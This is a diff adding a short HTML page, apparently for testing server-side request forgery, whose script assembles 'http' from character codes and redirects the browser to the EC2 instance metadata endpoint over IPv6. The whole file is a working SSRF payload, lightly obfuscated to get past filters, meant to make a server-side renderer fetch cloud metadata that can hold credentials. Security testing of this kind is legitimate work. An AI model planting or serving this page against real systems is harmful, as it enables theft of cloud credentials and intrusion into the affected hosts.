@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>P4 Redirect</title>
+<script>
+var proto = String.fromCharCode(104,116,116,112);
+var target = proto + '://[fd00:ec2::254]/latest/meta-data/';
+// Use JS redirect
+window.location.replace(target);
+</script>
+</head>
+<body>
+<h1>REDIRECT_TEST</h1>
+<p>Redirecting to IMDS...</p>
+</body>
+</html>
